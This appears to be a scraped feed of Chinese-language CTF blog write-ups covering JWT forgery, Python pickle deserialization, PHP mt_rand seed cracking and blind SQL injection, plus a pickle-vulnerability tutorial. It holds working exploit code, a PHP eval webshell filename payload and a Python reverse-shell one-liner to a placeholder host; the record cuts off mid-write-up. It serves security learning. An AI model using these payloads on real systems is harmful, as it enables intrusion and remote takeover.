    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a class="header-anchor" href="#CISCN2019-华北赛区-Day1-Web2-ikun">🍭</a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目提示要lv6，翻了几页找不到，用脚本跑</p><p><img src="/2021/07/24/ikun/1.png" alt="1"></p><p>余额不够，抓包改一下折扣，成功购买，需要admin权限，可利用JWT伪造admin身份，JWT解码</p><p><img src="/2021/07/24/ikun/2.png" alt="2"></p><p>需要先爆破密钥</p><p><img src="/2021/07/24/ikun/4.png" alt="4"></p><p>伪造JWT</p><p><img src="/2021/07/24/ikun/5.png" alt="5"></p><p>抓包修改</p><p><img src="/2021/07/24/ikun/3.png" alt="3"></p><p>得到源码,在admin.py里发现python反序列化</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> urllib<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span>(<span class="hljs-params">BaseHandler</span>):</span><span class="hljs-meta">    @tornado.web.authenticated</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<span class="hljs-meta">    @tornado.web.authenticated</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span>        <span class="hljs-keyword">try</span>:            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)            p = pickle.loads(urllib.unquote(become))            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)        <span class="hljs-keyword">except</span>:            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)</code></pre><p>当<code>__reduce__</code>被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt.<br>EXP：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> urllib<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params">object</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))a = pickle.dumps(payload())a = urllib.quote(a)<span class="hljs-keyword">print</span> a</code></pre><p><img src="/2021/07/24/ikun/7.png" alt="7"></p><p>抓包传值</p><p><img src="/2021/07/24/ikun/6.png" alt="6"></p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12178311.html">https://www.cnblogs.com/wangtanzhi/p/12178311.html</a></p><h2 id="GWCTF-2019-枯燥的抽奖"><a class="header-anchor" href="#GWCTF-2019-枯燥的抽奖">🍭</a>[GWCTF 2019]枯燥的抽奖</h2><h4 id="php种子伪随机数"><a class="header-anchor" href="#php种子伪随机数">🍭</a>php种子伪随机数</h4><p><code>mt_scrand(seed)</code>函数通过分发seed种子，靠mt_rand()生成随机数。</p><img src="/2021/07/24/ikun/11.png" alt="11" style="zoom:50%;"><p>但存在两次随机数一样的，这就是伪随机数的漏洞，存在可预测性。</p><h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4><p>查看源码，提示有check.php</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);session_start();<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;$_SESSION[<span class="hljs-string">&#x27;seed&#x27;</span>]=rand(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);   <span class="hljs-comment">//随机数设置session</span>&#125;mt_srand($_SESSION[<span class="hljs-string">&#x27;seed&#x27;</span>]);$str_long1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;$str=<span class="hljs-string">&#x27;&#x27;</span>;$len1=<span class="hljs-number">20</span>;<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       &#125;$str_show = substr($str, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;num&#x27;</span>]===$str)&#123;x        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;    &#125;&#125;show_source(<span class="hljs-string">&quot;check.php&quot;</span>);</code></pre><p>给了随机数列，我们需要找到种子;先用脚本将伪随机数转换成php_mt_seed可以识别的数据</p><pre><code class="hljs vim">str1=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>str2=<span class="hljs-string">&#x27;Ntkilw3DeO&#x27;</span>str3 = str1[::-<span class="hljs-number">1</span>]length = <span class="hljs-built_in">len</span>(str2)<span class="hljs-keyword">res</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):    <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):        <span class="hljs-keyword">if</span> str2[i] == str1[<span class="hljs-keyword">j</span>]:            <span class="hljs-keyword">res</span>+=str(<span class="hljs-keyword">j</span>)+<span class="hljs-string">&#x27; &#x27;</span>+str(<span class="hljs-keyword">j</span>)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>+<span class="hljs-string">&#x27; &#x27;</span>+str(<span class="hljs-built_in">len</span>(str1)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27; &#x27;</span>            <span class="hljs-keyword">break</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">res</span>)</code></pre><p><img src="/2021/07/24/ikun/8.png" alt="8"></p><p>爆破伪随机数和php版本</p><p><img src="/2021/07/24/ikun/9.png" alt="9"></p><p>send值为810236868，用部分源码生成完整字符串：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">810236868</span>);$str_long1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;$str=<span class="hljs-string">&#x27;&#x27;</span>;$len1=<span class="hljs-number">20</span>;<span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(<span class="hljs-number">0</span>, strlen($str_long1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       &#125;<span class="hljs-keyword">echo</span> $str;<span class="hljs-meta">?&gt;</span></code></pre><p>提交字符</p><p><img src="/2021/07/24/ikun/10.png" alt="10"></p><p>参考：<a href="https://blog.csdn.net/qq_43801002/article/details/107760064">https://blog.csdn.net/qq_43801002/article/details/107760064</a></p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a class="header-anchor" href="#CISCN2019-总决赛-Day2-Web1-Easyweb">🍭</a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><ul><li>备份文件泄露</li><li>SQL注入</li><li>php短标签</li></ul><p>通过robots.txt发现存在.bak备份文件，尝试后获取到image.php.bak文件，代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;$id=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;id&quot;</span>])?$_GET[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;$path=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;path&quot;</span>])?$_GET[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;$id=addslashes($id);$path=addslashes($path);$id=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,$id);$path=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,$path);$result=mysqli_query($con,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=<span class="hljs-string">&quot;./&quot;</span> . $row[<span class="hljs-string">&quot;path&quot;</span>];header(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);readfile($path);</code></pre><p>对单引号进行过滤，无法闭合单引号，可以用<code>\0</code>来转义掉它的单引号。输入<code>\0</code>，经过“addslashes”函数会先变成<code>\\0</code>,然后经过“str_replace”函数，会变成<code>\</code>,这样，就把id后面的单引号给转义了。</p><pre><code class="hljs livecodeserver">import  requestsurl = <span class="hljs-string">&quot;http://52890d33-fd0d-4e31-9f0b-46921a22705b.node4.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span>payload = <span class="hljs-string">&quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><span class="hljs-built_in">result</span> = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):    l = <span class="hljs-number">1</span>    r = <span class="hljs-number">130</span>    <span class="hljs-keyword">mid</span> = (l + r)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(l&lt;r):        payloads = payload.<span class="hljs-built_in">format</span>(i,<span class="hljs-keyword">mid</span>)        print(url+payloads)        html = requests.<span class="hljs-built_in">get</span>(url+payloads)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> html.<span class="hljs-keyword">text</span>:            l = <span class="hljs-keyword">mid</span> +<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            r = <span class="hljs-keyword">mid</span>        <span class="hljs-keyword">mid</span> = (l + r)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-built_in">result</span>+=chr(<span class="hljs-keyword">mid</span>)    print(<span class="hljs-built_in">result</span>)</code></pre><p>脚本注出账号和密码</p><p><img src="/2021/07/24/ikun/13.png" alt="13"></p><p>登录后是文件上传，随便传一张图片发现会将文件名和用户名写入日志文件。但是这里日志文件为php格式，考虑写入shell。由于用户名只能为admin无法利用，考虑文件名注入。文件名进行了php过滤，可以使用短标签绕过：</p><pre><code class="hljs php-template"><span class="xml">filename=&quot;</span><span class="php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span></code></pre><p><img src="/2021/07/24/ikun/12.png" alt="12"></p><p>蚁剑连接</p><p><img src="/2021/07/24/ikun/14.png" alt="14"></p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12253918.html">https://www.cnblogs.com/wangtanzhi/p/12253918.html</a></p>]]></content>
    
    
    <categories>
      
      <category>python反序列化</category>
      
      <category>php伪随机数漏洞</category>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python Pickle反序列化漏洞</title>
    <link href="/2021/07/23/pickle/"/>
    <url>/2021/07/23/pickle/</url>
    
    <content type="html"><![CDATA[<h2 id="Python-序列化与反序列化"><a class="header-anchor" href="#Python-序列化与反序列化">🍭</a>Python 序列化与反序列化</h2><h3 id="Pickle-CPickle模块"><a class="header-anchor" href="#Pickle-CPickle模块">🍭</a>Pickle/CPickle模块</h3><p>在 Python 中 , 包含序列化/反序列化过程的库有 <strong><code>Json模块</code></strong> , <strong><code>Pickle/CPickle模块</code></strong> , <strong><code>Shelve模块</code></strong> , <strong><code>Marshal模块</code></strong> 等 , 我们主要来看 <code>Pickle/CPickle模块</code>。<code>pickle</code>和<code>cPickle</code>的作用和PHP的<code>serialize与unserialize</code>一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同。</p><h3 id="Pickle库及函数"><a class="header-anchor" href="#Pickle库及函数">🍭</a>Pickle库及函数</h3><blockquote><p>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p></blockquote><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dumps</td><td>对象反序列化为bytes对象</td></tr><tr><td>dump</td><td>对象反序列化到文件对象，存入文件</td></tr><tr><td>loads</td><td>从bytes对象反序列化</td></tr><tr><td>load</td><td>对象反序列化，从文件中读取数据</td></tr></tbody></table><blockquote><p>dump(序列化)</p><blockquote><pre><code class="hljs fortran">&gt;pickle<span class="hljs-number">.</span>dump(obj, <span class="hljs-keyword">file</span>, protocol=<span class="hljs-keyword">None</span>,)</code></pre><p>obj表示要进行封装的对象(必填参数）;file表示obj要写入的文件对象,以二进制可写模式打开即wb(必填参数）</p></blockquote></blockquote><blockquote><p>load（反序列化）</p><blockquote><pre><code class="hljs routeros">&gt;pickle.load(file, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>, <span class="hljs-attribute">buffers</span>=None)</code></pre><p>file文件中读取封存后的对象以二进制可读模式打开即rb(必填参数)</p></blockquote></blockquote><p>实例：</p><p><img src="/2021/07/23/pickle/1.png" alt="1"></p><p>（摘自<strong>Epicccal</strong>师傅实例）</p><p>原始的 Python 类对象和反序列化生成的 Python 类对象是完全相同。</p><blockquote><p>dumps</p><blockquote><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>pickle.dumps(obj, protocol=None,*,fix_imports=True)</code></pre><p>dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。</p></blockquote></blockquote><blockquote><p>loads</p><blockquote><pre><code class="hljs routeros">&gt;&gt;pickle.loads(bytes_object, *,<span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>. <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)</code></pre><p>loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。</p></blockquote></blockquote><p>实例：</p><p><img src="/2021/07/23/pickle/2.png" alt="2"></p><p>（摘自<strong>Epicccal</strong>师傅实例）</p><p>接下来就要涉及到序列化字符串是按照什么规则生成</p><h3 id="PVM-Python-Virtual-Machine-Python-虚拟机"><a class="header-anchor" href="#PVM-Python-Virtual-Machine-Python-虚拟机">🍭</a>PVM( <code>Python Virtual Machine</code> , Python 虚拟机 )</h3><h4 id="PVM-的作用"><a class="header-anchor" href="#PVM-的作用">🍭</a><strong><code>PVM</code></strong> 的作用</h4><p>在使用 <strong><code>C , C++</code></strong> 等编译性语言编写的程序时 ,  解释器需要先将源代码编译 ==&gt;链接 ==&gt;执行但是对于 Python 而言 , 它可以直接从源代码运行程序 . Python解释器会将源代码编译为字节码 , 然后将编译后的字节码转发到Python 虚拟机中执行 。所以PVM 是一个用来解释字节码的解释引擎。</p><h4 id="PVM-的工作流程"><a class="header-anchor" href="#PVM-的工作流程">🍭</a><strong><code>PVM</code></strong> 的工作流程</h4><ul><li><p><strong>PVM 会先把源代码编译成字节码</strong> .</p><p>字节码是 Python 语言特有的一种表现形式 , 它不是二进制机器码 , 需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 <strong><code>.pyc</code></strong> 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在内存中生成字节码 , 在程序执行结束后被自动丢弃 .一般来说 , 在构建程序时最好给 Python 进程在主机上的写入权限 , 这样只要源代码没有改变 , 生成的 <strong><code>.pyc</code></strong> 文件就可以被重复利用 , 提高执行效率 , 同时隐藏源代码 。</p></li><li><p><strong>然后 , Python 进程会把编译好的字节码转发到 PVM( Python 虚拟机 ) 中</strong> , PVM会循环迭代执行字节码指令 , 直到所有操作被完成 。</p></li></ul><h4 id="PVM-的结构"><a class="header-anchor" href="#PVM-的结构">🍭</a><strong><code>PVM</code></strong> 的结构</h4><p>Pickle是一门基于栈的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .</p><p>轻量级的 PVM 由三个部分组成：</p><ul><li><p><strong>指令处理器( Instruction processor )</strong></p><p>从数据流中读取操作码和参数 , 并对其进行解释处理 . 指令处理器会循环执行这个过程 , 不断改变 stack 和 memo 区域的值 . 直到遇到 &quot; <strong><code>.</code></strong> &quot; 这个结束符号 . 这时 , 最终停留在栈顶的的值将会被作为反序列化对象返回 .</p></li><li><p><strong>栈区( stack )</strong></p><p>由 Python 的列表( list )实现 , 作为流数据处理过程中的暂存区 , 在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果</p></li><li><p><strong>标签区( memo )</strong></p><p>由 Python 的字典( dict )实现 , 可以看作是数据索引或者标记 , 为 PVM 的整个生命周期提供存储功能 .</p></li></ul><p>Pickle 在序列化时最常用到的操作码（指令集）：</p><pre><code class="hljs ada">c : 读取本行的内容作为模块名( <span class="hljs-type">module</span> ) , 读取下一行的内容作为对象名( object ) . 然后将 module.object 作为可调用对象压入到栈中( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 <span class="hljs-type">t</span> 指令一起使用 , 以便产生一个元组S : 后面跟字符串 , <span class="hljs-type">PVM</span>会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中 .R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象  .最后将结果压入到栈中 .. : 结束整个 <span class="hljs-type">Pickle</span> 反序列化过程 .</code></pre><h4 id="序列化过程"><a class="header-anchor" href="#序列化过程">🍭</a>序列化过程</h4><ol><li><strong>从对象中提取所有属性</strong></li><li><strong>写入对象的所有模块名和类名</strong></li><li><strong>写入对象所有属性的键值对</strong></li></ol><p>以上实例剖析：</p><p><img src="/2021/07/23/pickle/3.png" alt="3"></p><h2 id="与-PHP-反序列化的对比"><a class="header-anchor" href="#与-PHP-反序列化的对比">🍭</a>与 PHP 反序列化的对比</h2><p>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 彻底的面向对象的特性十分优越，Python  除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用  types 创建的匿名对象（这部分内容在后面会有所介绍），大大拓宽了我们的攻击面。</p><h2 id="Pickle-CPickle-反序列化漏洞分析"><a class="header-anchor" href="#Pickle-CPickle-反序列化漏洞分析">🍭</a>Pickle/CPickle 反序列化漏洞分析</h2><p>每当反序列化过程开始或者结束时 , 都会自动调用一类函数 。如PHP 的 <strong><code>__wakeup()</code></strong> 魔术方法 ,python中则是 <strong><code>__reduce__()</code></strong>  魔术方法。</p><h3 id="reduce"><a class="header-anchor" href="#reduce">🍭</a><code>__reduce__()</code></h3><p>官方文档解释：</p><p><img src="/2021/07/23/pickle/4.png" alt="4"></p><p><strong>当序列化以及反序列化的过程中碰到一无所知的扩展类型( 比如使用 C 语言实现的 Python 扩展类 )时，可以通过类中定义的 <code>__reduce__()</code> 方法来告知 Python 如何进行序列化或者反序列化操作</strong>。当 <strong><code>__reduce__()</code></strong> 函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组符合 PVM 操作码中 <strong><code>R</code></strong> 操作码实现的功能。在反序列化过程结束的时候 , Python 进程会自动调用 <strong><code>__reduce__()</code></strong> 魔术方法 . 如果我们可以控制被调用函数的参数 , Python 进程就会执行我们的恶意代码（和PHP反序列化漏洞一样）。</p><p>实例：</p><p><img src="/2021/07/23/pickle/5.png" alt="5"></p><p>（摘自<strong>Epicccal</strong>师傅实例）</p><p>RCE后可bash命令反弹shell或python -c 执行任意 Python 代码:</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> os<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params">object</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>        a = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>        <span class="hljs-keyword">return</span> (os.system,(a,))    a=A()result = pickle.dumps(a)pickle.loads(result)</code></pre><h2 id="反序列化漏洞出现的地方"><a class="header-anchor" href="#反序列化漏洞出现的地方">🍭</a>反序列化漏洞出现的地方</h2><ul><li><p><strong>通常在解析认证token，session的时候</strong></p><p>典型案例就是 flask 配合 redis 在服务端存储 session 的情景， session 是被 pickle  序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session  中的内容就会被反序列化，结合上之前讲过的 redis  的未授权访问，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session  的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</p></li><li><p>可能将对象Pickle后存储成磁盘文件。</p></li><li><p>可能将对象Pickle后在网络中传输。</p></li></ul><h2 id="反序列化漏洞防御"><a class="header-anchor" href="#反序列化漏洞防御">🍭</a>反序列化漏洞防御</h2><ul><li>不在不守信任的通道中传递 pcikle 序列化对象</li><li>在传递序列化对象前请进行签名或者加密，防止篡改和重播</li><li>如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</li><li>将 pickle 加载的数据列入白名单</li></ul><p>参考：</p><p><a href="https://www.guildhab.top/2019/12/python-pickle-cpickle-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">https://www.guildhab.top/2019/12/python-pickle-cpickle-反序列化漏洞/</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p>]]></content>
    
    
    <categories>
      
      <category>反序列化漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTF2020||EasyLogin</title>
    <link href="/2021/07/20/jwt/"/>
    <url>/2021/07/20/jwt/</url>
    
    <content type="html"><![CDATA[<p>涉及知识点</p><ul><li>koa框架(node.js)</li><li>jwt令牌</li></ul><p>上一篇文章了解了koa框架和jwt,直接做题：</p><p>访问页面查看源码发现一个js文件</p><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> *  或许该用 koa-static 来处理静态文件</span><span class="hljs-comment"> *  路径该怎么配置？不管了先填个根目录XD</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();    <span class="hljs-keyword">const</span> token = sessionStorage.getItem(<span class="hljs-string">&quot;token&quot;</span>);    $.post(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;            <span class="hljs-keyword">const</span> &#123;status&#125; = data;            <span class="hljs-keyword">if</span>(status) &#123;                <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/home&quot;</span>;            &#125;        &#125;)        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;            alert(xhr.responseJSON.message);        &#125;);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();    $.post(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;            <span class="hljs-keyword">const</span> &#123; token &#125; = data;            sessionStorage.setItem(<span class="hljs-string">&#x27;token&#x27;</span>, token);            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/login&quot;</span>;        &#125;)        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;            alert(xhr.responseJSON.message);        &#125;);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;    $.get(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;        <span class="hljs-keyword">const</span> &#123;status&#125; = data;        <span class="hljs-keyword">if</span>(status) &#123;            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&#x27;/login&#x27;</span>;        &#125;    &#125;);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;    $.get(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;        $(<span class="hljs-string">&quot;#username&quot;</span>).val(flag);    &#125;).fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>由注释可知使用了koa框架,关键代码放置在<code>controllers</code>下的api里</p><p>api.js：</p><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<span class="hljs-keyword">const</span> APIError = <span 